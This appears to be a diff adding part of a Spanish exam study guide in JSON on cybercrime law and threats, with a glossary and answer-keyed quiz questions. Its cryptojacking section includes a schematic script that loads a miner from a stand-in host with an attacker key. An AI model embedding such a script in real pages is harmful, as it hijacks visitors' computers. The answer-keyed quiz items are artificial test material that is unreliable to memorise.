+        {
+          "type": "list",
+          "title": "Desinfección y prevención",
+          "items": [
+            "Las primeras variantes se quitaban arrancando en **modo seguro** y editando el registro con **Regedit**; las mutaciones constantes lo hacen cada vez más difícil.",
+            "Los profesionales publican soluciones en foros y webs, pero muchas veces solo se recupera **una parte** de la información.",
+            "**Quitar el malware no descifra los archivos**: desinfectar y recuperar datos son problemas distintos.",
+            "La mejor defensa es **prevenir**: copias de seguridad continuas y concienciación (no navegar por webs dudosas ni aceptar plugins desconocidos)."
+          ]
+        },
+        {
+          "type": "term",
+          "term": "Cryptojacking (minería maliciosa de criptomonedas)",
+          "text": "La amenaza más emergente según el temario: malware oculto en ordenadores, móviles, navegadores o servidores que usa sus recursos para minar criptomonedas. Una variante es la **cryptowebsite**: una web atractiva con un script de minado; herramientas como **Cryptoloot** permiten montarla sin saber programar. La víctima no ve nada raro en la web."
+        },
+        {
+          "type": "code",
+          "title": "Idea de un script de cryptojacking incrustado (esquemático)",
+          "text": "<script src=\"https://minero.example/lib.js\"></script>\n<script>\n  var miner = new Miner('CLAVE-DEL-ATACANTE', { throttle: 0.2 });\n  miner.start();   // usa la CPU del visitante mientras la pestaña esté abierta\n</script>"
+        },
+        {
+          "type": "example",
+          "title": "Caso práctico",
+          "text": "Una gestoría sufre ransomware. El técnico elimina el programa, pero los archivos siguen cifrados: no tiene la clave. Por suerte, había copias de seguridad diarias comprobadas en un disco desconectado: restaura los datos **sin depender del extorsionador**. Aun así, debe investigar cómo entró el malware, porque la copia no elimina la causa."
+        },
+        {
+          "type": "exam",
+          "text": "«El éxito del ransomware se basa en…» → el **pago a través de sistemas de pago directo** (anónimos). Trampas: «facilidad de desinfección» (al contrario, cada vez es más difícil), «sencillez del código» o «mensaje individualizado según el sistema operativo». Y el ransomware se identifica como **virus de secuestro**; el «virus de la policía» fue solo una variante."
+        },
+        {
+          "type": "key",
+          "text": "El ransomware secuestra datos o sistemas y cobra en criptomonedas para garantizar anonimato. Desinfectar no recupera los archivos: la defensa real son las copias de seguridad y la concienciación."
+        }
+      ]
+    },
+    {
+      "id": "abusos-menores",
+      "title": "Difusión de contenidos de abusos a menores (art. 189)",
+      "pages": [
+        31,
+        34
+      ],
+      "blocks": [
+        {
+          "type": "p",
+          "text": "En la **difusión de contenidos ilícitos** la red no es la víctima, sino el **altavoz**: injurias, incitación al odio, amenazas, terrorismo o abusos a menores ya existían, pero Internet multiplica su alcance y ayuda al autor a esconderse. Los dos casos que más daño y rechazo social causan son los abusos a menores y el terrorismo."
+        },
+        {
+          "type": "p",
+          "text": "El temario prefiere hablar de **contenidos relacionados con abusos a menores**, porque la expresión «pornografía infantil» oculta que detrás de cada imagen hay un menor abusado. Pese a la enorme coordinación internacional, no se ha logrado frenar ni su difusión ni su producción, en buena parte porque mueve mucho dinero."
+        },
+        {
+          "type": "table",
+          "title": "Artículo 189 del Código Penal (tras la LO 1/2015)",
+          "head": [
+            "Apartado",
+            "Contenido"
+          ],
+          "rows": [
+            [
+              "189.1.a",
+              "Captar o utilizar a menores o personas con discapacidad necesitadas de especial protección en espectáculos o material pornográfico, financiarlo o lucrarse: prisión de 1 a 5 años."
+            ],
+            [
+              "189.1.b",
+              "Producir, vender, distribuir, exhibir, ofrecer o facilitar ese material, o poseerlo para esos fines, aunque venga del extranjero o su origen sea desconocido."
+            ],
+            [
+              "Definición",
+              "Material visual de un menor en conducta sexual explícita (real o simulada); representación de sus órganos sexuales con fines sexuales; material de alguien que **parezca** menor (salvo que tenga 18 años o más); e **imágenes realistas** de un menor (pornografía virtual o pseudopornografía, creada con imagen o voz manipulada)."
+            ],
+            [
+              "189.2",
+              "Prisión de 5 a 9 años si: menores de 16 años; trato degradante o violento; especial vulnerabilidad; peligro para la vida o salud; material de notoria importancia; organización; responsable familiar, tutor, maestro o con posición de confianza; o reincidencia."
+            ]
+          ]
+        },
+        {
+          "type": "list",
+          "title": "Vías por las que se difunde este material",
+          "items": [
+            "Webs de libre acceso e indexadas por los buscadores.",
+            "Webs indexadas pero de acceso condicionado: hay que entrar en la comunidad aportando archivos o pagando.",
+            "Webs no indexadas (**deep web**): hay que conocer la dirección y usar protocolos especiales.",
+            "Mensajería instantánea.",
+            "Foros abiertos o restringidos.",
+            "Correo electrónico individual o listas de correo.",
+            "Redes **P2P** (peer to peer, de igual a igual): los usuarios intercambian archivos directamente, sin servidor central."
+          ]
+        },
+        {
+          "type": "term",
+          "term": "Indexar / deep web",
+          "text": "Un buscador indexa una web cuando la incluye en su catálogo y la muestra en los resultados. La deep web es la parte de Internet que los buscadores convencionales no indexan, de modo que solo llega quien ya conoce la dirección."
+        },
+        {
+          "type": "example",
+          "title": "Caso práctico",
+          "text": "Una investigación no encuentra ninguna web pública con el material, pero detecta que circula en un grupo cerrado de mensajería y por una red P2P. Que no haya web pública **no** demuestra que no haya distribución: el análisis debe incluir canales privados y no indexados."
+        },
+        {
+          "type": "p",
+          "text": "Otro ejemplo de difusión ilícita es la de **obras protegidas por propiedad intelectual** (películas, series, música) en webs de descargas. El temario de este tema solo la cita de pasada (las botnets pueden alojar ese contenido), pero el test pregunta cómo ganan dinero esas webs: con **publicidad**, con la **venta de direcciones de correo** de sus usuarios y cobrando por **descargas priorizadas** (más rápidas o sin espera). Publicar críticas de cine no es una fuente de ingresos ilícita de ese negocio."
+        },
+        {
+          "type": "exam",
+          "text": "Si te preguntan dónde buscar contenido ilícito, la respuesta correcta nunca es «solo lo visible en buscadores». Y recuerda que el 189 castiga también la pseudopornografía, aunque no se haya usado a un menor real."
+        },
+        {
+          "type": "key",
+          "text": "El art. 189 castiga producir, difundir y poseer material de abusos a menores, incluida la pseudopornografía; se difunde por webs abiertas o cerradas, deep web, mensajería, foros, correo y P2P."
+        }
+      ]
+    },
+    {
+      "id": "terrorismo",
+      "title": "Internet al servicio del terrorismo",
+      "pages": [
+        34,
+        41
+      ],
+      "blocks": [
+        {
+          "type": "p",
+          "text": "Según la UNODC (Oficina de las Naciones Unidas contra la Droga y el Delito, informe de 2012), los grupos terroristas usan Internet para **reclutar, radicalizar, formar, financiar, difundir propaganda, entrenar e incitar**, y para reunir información. Este apartado no trata los ataques contra sistemas, sino **cómo usan la red como herramienta**."
+        },
+        {
+          "type": "term",
+          "term": "Ciberterrorismo",
+          "text": "Actividades terroristas realizadas en el ciberespacio con el objetivo de causar terror. La definición se apoya en la Decisión marco 2002/475/JAI, de 13 de junio de 2002, sobre la lucha contra el terrorismo."
+        },
+        {
+          "type": "table",
+          "title": "Los cinco usos de Internet por los grupos terroristas",
+          "head": [
+            "Uso",
+            "En qué consiste",
+            "Ejemplo"
+          ],
+          "rows": [
+            [
+              "Propaganda",
+              "Difundir ideales, justificar acciones y amenazar, en el momento elegido, sin que un periodista recorte o reinterprete el mensaje.",
+              "Al-Shabaab (Somalia) en redes sociales; vídeos de AQMI (Al Qaeda en el Magreb Islámico); publicidad de ETA en Twitter."
+            ],
+            [
+              "Proselitismo",
+              "Atraer simpatizantes y, tras un periodo de **radicalización**, captarlos como miembros, sin importar dónde estén. Foros en inglés, francés, español… para llegar a más gente.",
+              "Webs con formación ideológica, adiestramiento militar y propuestas de objetivos."
+            ],
+            [
+              "Financiación",
+              "Donaciones pedidas en webs, foros, chats o correos masivos; venta online de libros o vídeos; pagos por Ukash, Paysafe o PayPal; asociaciones pantalla.",
+              "Una ONG ficticia que desvía donaciones al grupo."
+            ],
+            [
+              "Comunicaciones",
+              "Coordinar células pequeñas y autónomas desde cibercafés sin identificación o con anonimato (deep web, correo por **TOR**) y cifrado.",
+              "Mujahideen Secrets, programa de cifrado vinculado a Al Qaeda."
+            ],
+            [
+              "Preparación de atentados",
+              "Usar información abierta: redes sociales, webs oficiales, prensa, imágenes de Google Maps, manuales de explosivos en foros.",
+              "Planificar un ataque sin exponerse a ser detectado haciendo reconocimiento físico."
+            ]
+          ]
+        },
+        {
+          "type": "term",
+          "term": "Radicalización",
+          "text": "Proceso que empieza con el adoctrinamiento de un simpatizante y termina cuando está decidido a cometer actos terroristas basados en una ideología extremista."
+        },
+        {
+          "type": "term",
+          "term": "TOR (The Onion Router)",
+          "text": "Red que hace pasar la conexión por varios nodos cifrados, como capas de una cebolla, para ocultar quién se conecta y a dónde."
+        },
+        {
+          "type": "exam",
+          "text": "Idea que pregunta el test: un caso con propaganda, captación y financiación por Internet demuestra que la red se usa con **fines organizativos y de difusión**, no solo para intrusiones técnicas. No hace falta hackear ningún sistema para cometer estos delitos, y usar un servicio público no excluye la finalidad ilícita."
+        },
+        {
+          "type": "key",
+          "text": "Los terroristas usan Internet para propaganda, proselitismo, financiación, comunicaciones y preparación de atentados: la red es su herramienta, no necesariamente su objetivo."
+        }
+      ]
+    },
+    {
+      "id": "ciberacoso",
+      "title": "Ciberacoso, ciberbullying y ciberbaiting",
+      "pages": [
+        42,
+        45
+      ],
+      "blocks": [
+        {
+          "type": "analogy",
+          "text": "Un insulto en el patio se oye una vez y se lo lleva el viento. Ese mismo insulto en un grupo de WhatsApp de toda la clase queda escrito, lo ven cien personas, alguien lo reenvía, y la víctima lo vuelve a leer en su cuarto a las once de la noche. El acoso no acaba al salir del colegio."
+        },
+        {
+          "type": "term",
+          "term": "Ciberacoso",
+          "text": "Agresión psicológica **que perdura en el tiempo**, causada por una o varias personas contra otra, usando las TIC (tecnologías de la información y la comunicación). Suele ser la continuación en la red de un acoso que también existe en el mundo físico."
+        },
+        {
+          "type": "table",
+          "title": "Tipos de acoso por la red",
+          "head": [
+            "Término",
+            "Quién acosa a quién",
+            "Finalidad"
+          ],
+          "rows": [
+            [
+              "Ciberacoso",
+              "Adultos",
+              "Variada: laboral (desprestigiar a la víctima), sexual (obtener imágenes), personal o venganza (publicar fotos íntimas de una expareja), o imitación (difundir en cadena lo que otros publicaron)."
+            ],
+            [
+              "Ciberbullying",
+              "Menores contra menores, en edad escolar",
+              "Solo la **humillación** de la víctima por su grupo de clase o deporte. Sin componente sexual."
+            ],
+            [
+              "Ciberbaiting",
+              "Alumnos contra profesores o educadores",
+              "Humillar al docente."
+            ],
+            [
+              "Grooming",
+              "Un adulto contra un menor",
+              "Acercamiento sexual (ver apartado siguiente)."
+            ]
+          ]
+        },
+        {
+          "type": "list",
+          "title": "Dos factores que agravan el acoso en la red",
+          "items": [
+            "**Anonimato**: la víctima puede no saber quién la ataca.",
+            "**Persistencia y universalidad**: lo publicado en redes sigue ahí y lo ve muchísima gente, lo que multiplica la indefensión y la humillación."
+          ]
+        },
+        {
+          "type": "list",
+          "title": "Requisitos para hablar de acoso",
+          "items": [
+            "Debe ser **repetido**: un hecho aislado no es ciberacoso.",
+            "Puede haber **jerarquía de poder**: entre menores siempre; entre adultos, sobre todo en acoso laboral y sexual.",
+            "La difusión inmediata y la dificultad de borrar lo publicado **amplifican** el daño.",
+            "Para ser ciberbullying no puede tener **elementos sexuales** ni lo puede causar un adulto; si los tiene, hablamos de grooming."
+          ]
+        },
+        {
+          "type": "p",
+          "text": "Los canales habituales son el móvil (mensajes, fotos y vídeos), la mensajería instantánea, los chats, el correo, los foros, las redes sociales y las plataformas de fotos y vídeos. El acosador también usa la red para seguir a la víctima e incluso, si sabe, para entrar en sus cuentas."
+        },
+        {
+          "type": "example",
+          "title": "Caso práctico",
+          "text": "Lucía, de 14 años, sufre burlas en clase. Sus compañeros crean un grupo de mensajería donde comparten memes con su cara y siguen insultándola por la tarde. Es **ciberbullying**: el medio digital continúa y amplía el acoso del aula; no deja de serlo porque acabe el horario escolar. En otro caso, un hombre publica fotos íntimas de su expareja para vengarse y cientos de personas las reenvían: es **ciberacoso con finalidad de venganza**, y lo que amplifica el daño es la facilidad de copiar y difundir más allá del primer emisor."
+        },
+        {
+          "type": "exam",
+          "text": "Lo que diferencia el ciberacoso de un mensaje ofensivo aislado es la **continuidad** de la conducta. No hace falta ningún malware ni un ataque técnico, ni que no haya contacto fuera de la red. Y si los implicados son menores en edad escolar, es ciberbullying."
+        },
+        {
+          "type": "key",
+          "text": "Ciberacoso entre adultos, ciberbullying entre escolares, ciberbaiting de alumnos a profesores y grooming de adulto a menor con fin sexual. Siempre exige repetición, y la red agrava el daño por anonimato y difusión."
+        }
+      ]
+    },
+    {
+      "id": "grooming",
+      "title": "Grooming: el adulto que se disfraza de amigo",
+      "pages": [
+        45,
+        48
+      ],
+      "blocks": [
+        {
+          "type": "term",
+          "term": "Grooming (child grooming o Internet grooming)",
+          "text": "Acoso de un **adulto** hacia un **menor** cuyo objetivo final es el **acercamiento físico con intenciones sexuales**. El adulto usa la red para ganarse la confianza del menor y crear un vínculo emocional; primero el abuso es virtual y después busca que sea real."
+        },
+        {
+          "type": "p",
+          "text": "El Código Penal castiga el **mero contacto** con un menor de 16 años por Internet, teléfono u otra TIC para proponerle un encuentro con fines sexuales, siempre que vaya acompañado de **actos materiales** para acercarse. Es una **anticipación de la barrera penal**: se castiga antes de que llegue a producirse la agresión. La pena es de 1 a 3 años de prisión o multa de 12 a 24 meses, y va a su mitad superior si hay coacción, intimidación o engaño."
+        },
+        {
+          "type": "term",
+          "term": "Artículo 183 ter (hoy 183)",
+          "text": "El temario lo cita como 183 ter, introducido por la LO 1/2015. Reformas posteriores del Código Penal (la LO 10/2022) han renumerado estos artículos y hoy el contenido está en el artículo 183. Para el test, quédate con la idea: contacto con menor de 16 años + propuesta de encuentro + actos materiales."
+        },
+        {
+          "type": "steps",
+          "title": "Las fases del grooming",
+          "items": [
+            "**Contacto**: en redes sociales, foros o webs para menores, el adulto se hace pasar por un niño o niña de edad parecida con los mismos gustos. Objetivo: conseguir su correo o su mensajería privada.",
+            "**Ganarse la confianza y obtener información**: conversaciones triviales sobre deporte, música o juegos para conocer su dirección, colegio, rutinas y conflictos familiares. Usa una grabación de webcam en bucle para no mostrarse. Si sabe, instala malware para espiar sus cuentas y su webcam.",
+            "**Intercambio de imágenes y seducción**: insinuaciones sexuales poco a poco, petición de fotos, actos ante la webcam presentados como un juego. Con víctimas algo mayores, la táctica del cibernovio o cibernovia.",
+            "**Acoso**: se quita la máscara y **chantajea** con difundir lo que tiene para obtener actos más explícitos o un encuentro físico. Puede cambiarle la contraseña del correo.",
+            "**Difusión**: reparte las imágenes entre familiares y amigos para hacer daño o pide contactos de otros menores."
+          ]
+        },
+        {
+          "type": "example",
+          "title": "Caso práctico",
+          "text": "«Dani, 13 años» habla con Marta en un foro de videojuegos y le propone seguir por una aplicación privada. Semanas después, ya es su confidente. Un día le pide que guarde el secreto y le recuerda que tiene fotos suyas: si no le envía más, se las mandará a sus padres. Ahí se ve el cambio clave: la **confianza y los datos obtenidos se convierten en instrumentos de control**."
+        },
+        {
+          "type": "exam",
+          "text": "La primera fase busca **crear un acceso personal y una confianza** que faciliten la aproximación abusiva, no certificar identidades ni evitar obtener información. En la fase de acoso, lo que hay que identificar es el uso de la confianza y de los datos como **chantaje**; nunca supone consentimiento ni relación entre iguales."
+        },
+        {
+          "type": "key",
+          "text": "El grooming es un adulto que, fingiendo ser un igual, gana la confianza de un menor para abusar sexualmente de él. Sigue cinco fases: contacto, confianza, seducción, acoso y difusión."
+        }
+      ]
+    },
+    {
+      "id": "honor-identidad",
+      "title": "Injurias, calumnias y suplantación de identidad en redes",
+      "pages": [
+        48,
+        53
+      ],
+      "blocks": [
+        {
+          "type": "p",
+          "text": "El **derecho al honor**, junto con la intimidad y la propia imagen, es un **derecho fundamental** reconocido en el artículo 18 de la Constitución de 1978 y desarrollado por la **Ley Orgánica 1/1982** (protección civil del derecho al honor, la intimidad y la propia imagen). Cuando se ataca con la palabra, aparecen dos delitos."
+        },
+        {
+          "type": "table",
+          "title": "Injuria frente a calumnia",
+          "head": [
+            "Aspecto",
+            "Injuria (art. 208)",
+            "Calumnia (art. 205)"
+          ],
+          "rows": [
+            [
+              "Qué es",
+              "Acción o expresión que lesiona la dignidad de otra persona, menoscaba su fama o atenta contra su propia estimación",
+              "Imputar a alguien **un delito** sabiendo que es falso o con temerario desprecio hacia la verdad"
+            ],
+            [
+              "Ejemplo",
+              "Llamar «tirano de mierda» a un alcalde o «violadores, bananeros y cobardes» a unas autoridades",
+              "Publicar «Juan Pérez robó 3 000 euros de la caja de la asociación el 5 de marzo», sabiendo que no es cierto"
+            ],
+            [
+              "Con publicidad",
+              "Injurias graves: multa de 6 a 14 meses (art. 209)",
+              "Prisión de 6 meses a 2 años o multa de 12 a 24 meses (art. 206)"
+            ],
+            [
+              "Sin publicidad",
+              "Multa de 3 a 7 meses",
+              "Multa de 6 a 12 meses"
+            ]
+          ]
+        },
+        {
+          "type": "list",
+          "title": "Requisitos de la calumnia según el Tribunal Supremo",
+          "items": [
+            "Se imputa un **delito**.",
+            "A una persona **claramente identificable**.",
+            "Concretando el delito, su objeto y la persona. Llamar a alguien «ladrón» o «asesino» de forma genérica es, como mucho, injuria."
+          ]
+        },
+        {
+          "type": "p",
+          "text": "Ambos son **delitos privados**: solo se persiguen si el ofendido presenta una **querella** (una denuncia formal en la que la víctima se constituye como acusación), no de oficio. Según el **artículo 211**, se consideran hechos con publicidad los propagados por imprenta, radio o **cualquier medio de eficacia semejante**: una red social cumple con creces ese requisito, así que la pena se agrava."
+        },
+        {
+          "type": "example",
+          "title": "Caso real que cita el temario",
+          "text": "Unos policías locales dijeron de una compañera, entre otras cosas, que había conseguido sus puestos acostándose con superiores. El tribunal entendió que no había calumnia (no se le imputaba un delito concreto) pero sí **injurias**, por atentar claramente contra su dignidad."
+        },
+        {
+          "type": "table",
+          "title": "Suplantación frente a usurpación",
+          "head": [
+            "Concepto",
+            "Qué ocurre"
+          ],
+          "rows": [
+            [
+              "Suplantación de personalidad",
+              "Se usa un perfil ajeno para ocultar la propia identidad, sin actuar como si se fuera la otra persona."
+            ],
+            [
+              "Usurpación de identidad",
+              "Se finge ser la otra persona de forma continua para ejercer sus derechos."
+            ]
+          ]
+        },
+        {
+          "type": "p",
+          "text": "El Código Penal solo tiene un artículo para esto, el **401**: «el que usurpare el estado civil de otro» (prisión de 6 meses a 3 años). Es tan vago que los tribunales deciden mucho. El Tribunal Supremo (STS 1045/2011) exige **cierta permanencia** y la intención de usurpar **plenamente** la personalidad: usar solo el nombre y los apellidos no basta."
+        },
+        {
+          "type": "table",
+          "title": "Tres situaciones en redes sociales",
+          "head": [
+            "Situación",
+            "Consecuencia"
+          ],
+          "rows": [
+            [
+              "Perfil falso solo con nombre y apellidos",
+              "No es delito del 401. Si causa perjuicio, cabe responsabilidad **civil** (indemnización)."
+            ],
+            [
+              "Perfil falso con foto u otros datos personales",
+              "Puede ser delito del 401, y además vulnera el derecho a la propia imagen (art. 18 CE)."
+            ],
+            [
+              "Entrar en la cuenta real de la víctima y usarla",
+              "Art. 401 más, según lo que haga: 197.1 si lee sus mensajes, 197.2 si se apodera de datos personales, 197 bis si accede sin consentimiento saltándose la seguridad."
+            ]
+          ]
+        },
+        {
+          "type": "exam",
+          "text": "Si se acusa de un delito concreto y falso, es calumnia; si solo se insulta o desprestigia, es injuria. En Internet hay publicidad (art. 211) y la pena sube. Y un perfil falso con solo el nombre no es delito penal."
+        },
+        {
+          "type": "key",
+          "text": "Calumnia = imputar un delito falso; injuria = ofender la dignidad. Ambas exigen querella y se agravan con publicidad, como la de las redes. La usurpación de identidad (art. 401) exige más que usar un nombre."
+        }
+      ]
+    }
+  ],
+  "summary": [
+    "Los daños informáticos atacan la confidencialidad, la integridad y la disponibilidad; son los delitos más puramente informáticos.",
+    "Art. 264: dañar datos y programas; 264 bis: interrumpir sistemas (DoS); 264 ter: producir o facilitar herramientas y contraseñas para ello.",
+    "Art. 197: apoderarse de correos o datos personales para vulnerar la intimidad (basta el acceso); 197 bis: acceso ilícito saltando la seguridad e interceptación de transmisiones no públicas.",
+    "El malware moderno busca lucro y discreción; el polimorfismo fue su salto cualitativo. En móviles busca SMS de tarificación adicional, datos bancarios, credenciales y botnets móviles.",
+    "Una APT es dirigida, avanzada y persistente, muta para no ser detectada y sigue siete fases cíclicas: reconocimiento, intrusión, backdoor, credenciales, utilidades, escalada y extracción, persistencia.",
+    "Una botnet es una red de zombis controlada por un botmaster mediante un C&C; se usa para spam, DDoS, malware, robo, alojar fraudes o alquilarse.",
+    "El ransomware (virus de secuestro) triunfa por su sencillez, los exploit kits, la falta de intermediarios y el pago directo anónimo en criptomonedas. Desinfectar no recupera los archivos: hay que tener copias.",
+    "El art. 189 castiga el material de abusos a menores, incluida la pseudopornografía, que circula por webs, deep web, mensajería, foros, correo y P2P.",
+    "Los terroristas usan Internet para propaganda, proselitismo, financiación, comunicaciones y preparar atentados.",
+    "Ciberacoso (adultos), ciberbullying (escolares), ciberbaiting (contra profesores) y grooming (adulto a menor con fin sexual) exigen repetición.",
+    "Calumnia es imputar un delito falso; injuria, ofender la dignidad. La usurpación de identidad (art. 401) exige más que usar un nombre."
+  ],
+  "glossary": [
+    {
+      "term": "APT (Advanced Persistent Threat)",
+      "text": "Amenaza persistente avanzada: ataque dirigido, sofisticado y prolongado para robar información de una organización concreta."
+    },
+    {
+      "term": "Botnet",
+      "text": "Red de equipos infectados (bots o zombis) controlados en remoto por un botmaster."
+    },
+    {
+      "term": "Botmaster",
+      "text": "Persona que controla y mantiene una botnet."
+    },
+    {
+      "term": "C&C (Command and Control)",
+      "text": "Servidor de mando y control desde el que se dan órdenes al malware."
+    },
+    {
+      "term": "Backdoor",
+      "text": "Puerta trasera: acceso oculto que permite volver a entrar en un sistema comprometido."
+    },
+    {
+      "term": "Cryptojacking",
+      "text": "Uso oculto de los recursos de la víctima para minar criptomonedas."
+    },
+    {
+      "term": "DoS / DDoS",
+      "text": "Denegación de servicio (distribuida): saturar un sistema para que deje de funcionar."
+    },
+    {
+      "term": "Exploit kit",
+      "text": "Paquete de herramientas que automatiza ataques y se vende en el mercado del cibercrimen."
+    },
+    {
+      "term": "Grooming",
+      "text": "Acercamiento de un adulto a un menor por la red con fines sexuales."
+    },
+    {
+      "term": "Ciberbullying",
+      "text": "Acoso entre menores en edad escolar mediante las TIC."
+    },
+    {
+      "term": "Ciberbaiting",
+      "text": "Acoso de alumnos a profesores mediante las TIC."
+    },
+    {
+      "term": "Habeas data",
+      "text": "Nombre del delito contra la privacidad informática del art. 197.2."
+    },
+    {
+      "term": "Ley orgánica",
+      "text": "Ley que exige mayoría absoluta y regula derechos fundamentales o penas; el Código Penal lo es."
+    },
+    {
+      "term": "Decisión marco",
+      "text": "Instrumento de la UE, antecesor de la directiva actual, que obligaba a los Estados a adaptar su legislación."
+    },
+    {
+      "term": "Malware polimórfico",
+      "text": "Malware que cambia su estructura para evitar la detección por firmas."
+    },
+    {
+      "term": "P2P (peer to peer)",
+      "text": "Red en la que los usuarios intercambian archivos directamente entre sí."
+    },
+    {
+      "term": "Ransomware",
+      "text": "Malware que bloquea o cifra y exige un rescate; también llamado virus de secuestro."
+    },
+    {
+      "term": "Spear phishing",
+      "text": "Engaño por correo dirigido a una persona concreta, preparado a medida."
+    },
+    {
+      "term": "TIC",
+      "text": "Tecnologías de la información y la comunicación."
+    },
+    {
+      "term": "TOR",
+      "text": "Red de anonimato que oculta el origen de las conexiones mediante capas de cifrado."
+    },
+    {
+      "term": "UNODC",
+      "text": "Oficina de las Naciones Unidas contra la Droga y el Delito."
+    }
+  ],
+  "questions": {
+    "ciberdelitos-t09-01": {
+      "section": "danos-y-triada",
+      "reasoning": "El temario define los daños informáticos como ataques contra los principios de confidencialidad, integridad y disponibilidad. De las cuatro opciones, solo una es uno de esos tres principios: la integridad, que se lesiona cuando se borran, alteran o destruyen datos.",
+      "options": {
+        "a": "Incorrecta. El correo electrónico es un medio de comunicación, no un principio de seguridad.",
+        "b": "Correcta. La integridad es uno de los tres pilares que atacan los daños informáticos: alterar o suprimir datos ajenos la vulnera.",
+        "c": "Incorrecta. «Indisponibilidad» no es un principio, sino el efecto de un ataque; el principio es la disponibilidad.",
+        "d": "Incorrecta. La lealtad no forma parte de la tríada confidencialidad, integridad y disponibilidad."
+      }
+    },
+    "ciberdelitos-t09-02": {
+      "section": "danos-y-triada",
+      "reasoning": "La disponibilidad garantiza que un sistema funcione cuando los usuarios autorizados lo necesitan. El temario pone como ejemplo de ataque contra ella dejar fuera de servicio un sistema completo, por ejemplo con una denegación de servicio. No hace falta leer ni modificar datos.",
+      "options": {
+        "a": "Incorrecta. La funcionalidad no es uno de los principios de seguridad de la tríada.",
+        "b": "Incorrecta. La productividad puede verse afectada, pero no es un principio de seguridad.",
+        "c": "Incorrecta. La confidencialidad se ataca cuando alguien accede sin permiso a la información, no cuando el sistema deja de funcionar.",
+        "d": "Correcta. Dejar un sistema fuera de servicio impide a los usuarios legítimos usarlo: ataca la disponibilidad."
+      }
+    },
+    "ciberdelitos-t09-03": {
+      "section": "malware",
+      "reasoning": "El temario dice expresamente que el verdadero salto cualitativo llegó cuando los desarrolladores empezaron a diseñar especímenes polimórficos, capaces de variar su estructura para eludir los antimalware. Eso hizo imposible contar las variantes, porque puede haber una por equipo.",
+      "options": {
+        "a": "Incorrecta. El malware para smartphones es un nuevo campo de distribución, pero no es lo que el temario califica de salto cualitativo.",
+        "b": "Incorrecta. La ingeniería social es una vía de distribución clásica, no un cambio en el diseño del malware.",
+        "c": "Correcta. El polimorfismo, que permite al malware cambiar su estructura para no ser detectado, es el salto cualitativo.",
+        "d": "Incorrecta. Los troyanos son un tipo de malware antiguo y no suponen ese salto cualitativo."
+      }
+    },
+    "ciberdelitos-t09-04": {
+      "section": "malware",
+      "reasoning": "Entre los objetivos del malware móvil, el temario cita enviar mensajes a servicios de tarificación adicional, porque así el atacante cobra. También cita robar credenciales de correo y redes sociales, robar información particular y usar el móvil en una botnet. La opción a cambia «tarificación adicional» por «teléfonos privados»: enviar SMS a un particular no reporta beneficio y no figura entre los objetivos.",
+      "options": {
+        "a": "Correcta. No es un objetivo: el temario habla de mensajes a servicios de tarificación adicional, no a números privados.",
+        "b": "Incorrecta. Robar las credenciales de las redes sociales configuradas en el dispositivo sí es un objetivo citado.",
+        "c": "Incorrecta. El robo de información particular, como contactos o fotos, sí figura entre los objetivos.",
+        "d": "Incorrecta. Usar el móvil de forma remota como parte de una botnet móvil sí es un objetivo citado."
+      }
+    },
+    "ciberdelitos-t09-05": {
+      "section": "apt",
+      "reasoning": "Una APT es dirigida (diseñada para un objetivo concreto), avanzada (autores con amplísimos recursos) y persistente (permanece mucho tiempo). Además, está en constante mutación y actualiza su malware precisamente para no ser detectada. Por tanto, decir que no se modifica es lo contrario de lo que caracteriza una APT.",
+      "options": {
+        "a": "Incorrecta. Estar desarrollada a medida para un objetivo concreto sí es una característica de la APT.",
+        "b": "Incorrecta. Los autores cuentan con amplísimos recursos tecnológicos, humanos y económicos.",
+        "c": "Correcta. Es falsa: el malware de una APT se actualiza y muta constantemente para no ser detectado por firmas.",
+        "d": "Incorrecta. La permanencia durante un periodo muy prolongado es justo lo que la hace persistente."
+      }
+    },
+    "ciberdelitos-t09-06": {
+      "section": "apt",
+      "reasoning": "Las siete fases de Mandiant son: reconocimiento, intrusión inicial, backdoor, obtención de credenciales, instalación de utilidades, escalada de privilegios con movimiento lateral y extracción, y persistencia. Ninguna consiste en desinstalar el software de comunicaciones; al contrario, la comunicación con el C&C se mantiene para seguir controlando la red.",
+      "options": {
+        "a": "Incorrecta. El reconocimiento es la primera fase.",
+        "b": "Incorrecta. La obtención de credenciales de usuario es la cuarta fase.",
+        "c": "Correcta. Desinstalar el software de comunicaciones no es ninguna fase; la APT necesita mantener el contacto con su mando y control.",
+        "d": "Incorrecta. La escalada de privilegios forma parte de la sexta fase."
+      }
+    },
+    "ciberdelitos-t09-07": {
+      "section": "botnet",
+      "reasoning": "El temario llama botnet a la red de ordenadores que, infectados por malware, son controlados de manera coordinada y remota por un botmaster. Las demás opciones son nombres inventados que mezclan tipos de malware o de fraude.",
+      "options": {
+        "a": "Incorrecta. «Red de malware» no es el término técnico; el malware es solo el medio de infección.",
+        "b": "Incorrecta. El phishing es una técnica de engaño, y una botnet puede usarse para enviarlo, pero no da nombre a la red.",
+        "c": "Incorrecta. Un troyano es un tipo de malware; la red de equipos controlados no se llama así.",
+        "d": "Correcta. Es la definición de botnet: equipos infectados (bots o zombis) controlados de forma coordinada y remota."
+      }
+    },
+    "ciberdelitos-t09-08": {
+      "section": "ransomware",
+      "reasoning": "Ransom significa rescate. El ransomware bloquea el sistema o cifra los archivos y pide dinero para devolverlos, exactamente como un secuestro. Por eso se le identifica como virus de secuestro.",
+      "options": {
+        "a": "Incorrecta. Un troyano es un malware que se disfraza de programa legítimo; no es el otro nombre del ransomware.",
+        "b": "Correcta. El ransomware secuestra datos o sistemas a cambio de un rescate: es el virus de secuestro.",
+        "c": "Incorrecta. El «virus de la policía» fue una variante concreta que usaba logotipos policiales, no el nombre de todo el ransomware.",
+        "d": "Incorrecta. «Virus mutante» alude al polimorfismo, que no es lo que define al ransomware."
+      }
+    },
+    "ciberdelitos-t09-09": {
+      "section": "ransomware",
+      "reasoning": "El temario atribuye parte del éxito del ransomware a que los delincuentes evitan transferencias y mulas y cobran mediante sistemas de pago directo (antes vales Ukash o Paysafecard, hoy criptomonedas) que garantizan al máximo el anonimato. Las demás opciones contradicen el temario o no aparecen en él.",
+      "options": {
+        "a": "Incorrecta. Al contrario: las mutaciones hacen la desinfección cada vez más difícil.",
+        "b": "Incorrecta. El temario no menciona la personalización del mensaje según el sistema operativo como factor de éxito.",
+        "c": "Correcta. El pago directo y anónimo del rescate dificulta rastrear al autor y favorece su impunidad.",
+        "d": "Incorrecta. El temario habla de la sencillez de cometer el delito (gracias a los exploit kits), no de un código simple."
+      }
+    },
+    "ciberdelitos-t09-10": {
+      "section": "abusos-menores",
